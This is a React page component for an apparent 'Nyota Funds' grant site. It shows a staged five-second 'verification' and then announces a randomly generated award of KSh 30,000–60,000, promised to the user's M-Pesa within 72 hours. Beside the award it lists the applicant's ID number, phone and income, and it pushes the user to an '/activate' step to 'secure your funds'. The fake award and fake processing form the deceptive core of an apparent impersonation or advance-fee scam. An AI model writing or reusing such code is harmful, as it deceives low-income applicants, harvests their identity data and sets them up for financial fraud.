// src/pages/ProcessingPage.js
import React, { useState, useEffect } from 'react';
import { Check, Loader2, Star, User, Phone, IdCard, MapPin, GraduationCap, DollarSign, Users } from 'lucide-react';
import { Link } from 'react-router-dom';

export default function ProcessingPage() {
  const [loading, setLoading] = useState(true);
  const [applicationData, setApplicationData] = useState(null);
  const [fundingAmount, setFundingAmount] = useState(0);

  useEffect(() => {
    const data = localStorage.getItem('nyotaApplication');
    if (data) {
      const parsed = JSON.parse(data);
      setApplicationData(parsed);

      // Use saved amount if exists, otherwise generate once and save
      const savedAmount = localStorage.getItem('nyotaFundingAmount');
      if (savedAmount) {
        setFundingAmount(parseInt(savedAmount));
      } else {
        const amount = Math.floor(Math.random() * (60000 - 30000 + 1)) + 30000;
        localStorage.setItem('nyotaFundingAmount', amount.toString());
        setFundingAmount(amount);
      }
    }

    const timer = setTimeout(() => setLoading(false), 5000);
    return () => clearTimeout(timer);
  }, []);

  const formatAmount = (amount) => {
    return amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
  };

  return (
    <>
      <header className="bg-kenya-black text-white py-5 shadow-xl">
        <div className="max-w-2xl mx-auto px-4 flex items-center gap-3">
          <div className="w-10 h-10 kenya-gradient rounded-full flex items-center justify-center shadow-lg">
            <Star className="w-6 h-6 text-white" />
          </div>
          <h1 className="text-xl font-black">NYOTA Processing</h1>
        </div>
      </header>

      <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center px-6">
        <div className="bg-white rounded-3xl shadow-2xl p-10 max-w-lg w-full text-center border-t-8 border-kenya-green">

          {loading ? (
            <>
              <div className="animate-spin mb-8">
                <Loader2 className="w-20 h-20 text-kenya-green mx-auto" />
              </div>
              <h2 className="text-3xl font-black text-kenya-black mb-4">
                Nyota Funds Processing...
              </h2>
              <p className="text-gray-600 text-lg">
                Please wait while we verify your application
              </p>
              <div className="mt-8 flex justify-center gap-3">
                <div className="w-4 h-4 bg-kenya-green rounded-full animate-bounce"></div>
                <div className="w-4 h-4 bg-kenya-red rounded-full animate-bounce delay-150"></div>
                <div className="w-4 h-4 bg-kenya-black rounded-full animate-bounce delay-300"></div>
              </div>
            </>
          ) : (
            <>
              <div className="mb-8">
                <div className="w-24 h-24 bg-kenya-green rounded-full flex items-center justify-center mx-auto animate-pulse">
                  <Check className="w-16 h-16 text-white" />
                </div>
              </div>

              <h2 className="text-3xl font-black text-kenya-black mb-6">
                Application Received!
              </h2>

              <div className="bg-gradient-to-r from-kenya-green/10 to-kenya-red/10 rounded-2xl p-6 mb-8 border-2 border-kenya-green/30">
                <p className="text-lg font-bold text-kenya-black leading-relaxed">
                  Hello, <span className="text-kenya-green">{applicationData?.fullName || 'Applicant'}</span>
                </p>
                <p className="text-xl font-black text-kenya-black mt-3">
                  You have successfully applied for Nyota Funds!
                </p>
                <p className="text-2xl font-black text-kenya-red mt-4">
                  KSh {formatAmount(fundingAmount)}
                </p>
                <p className="text-lg text-gray-700 mt-2">
                  will be deposited to your M-Pesa number in <strong>72 hours</strong>.
                </p>
                <p className="text-base text-gray-600 mt-4 italic">
                  Kindly complete application below to <strong>activate your account</strong> and secure your funds.
                </p>
              </div>

              <Link to="/activate" className="block">
                <button className="w-full bg-kenya-red hover:bg-red-700 text-white font-bold text-lg py-4 px-8 rounded-full shadow-xl hover:shadow-2xl transform hover:scale-105 transition-all duration-300 flex items-center justify-center gap-3 border-4 border-white">
                  <Check className="w-7 h-7" />
                  Complete Application
                </button>
              </Link>

              <div className="mt-10 bg-gray-50 rounded-2xl p-6 text-left space-y-4 border border-gray-200">
                <h3 className="text-xl font-bold text-kenya-black mb-4 text-center">Your Application Details</h3>
                <div className="flex items-center gap-3"><User className="w-5 h-5 text-kenya-green" /> <span className="font-medium">Name:</span> {applicationData?.fullName}</div>
                <div className="flex items-center gap-3"><Phone className="w-5 h-5 text-kenya-green" /> <span className="font-medium">Phone:</span> {applicationData?.phone}</div>
                <div className="flex items-center gap-3"><IdCard className="w-5 h-5 text-kenya-green" /> <span className="font-medium">ID:</span> {applicationData?.idNumber}</div>
                <div className="flex items-center gap-3"><MapPin className="w-5 h-5 text-kenya-green" /> <span className="font-medium">County:</span> {applicationData?.county}</div>
                <div className="flex items-center gap-3"><GraduationCap className="w-5 h-5 text-kenya-green" /> <span className="font-medium">Education:</span> {applicationData?.education}</div>
                <div className="flex items-center gap-3"><DollarSign className="w-5 h-5 text-kenya-green" /> <span className="font-medium">Income:</span> {applicationData?.income}</div>
                <div className="flex items-center gap-3"><Users className="w-5 h-5 text-kenya-green" /> <span className="font-medium">Family:</span> {applicationData?.family}</div>
              </div>

              <p className="text-xs text-gray-500 mt-8">
                You will receive an SMS confirmation shortly. Do not share your details.
              </p>
            </>
          )}
        </div>
      </div>
    </>
  );
}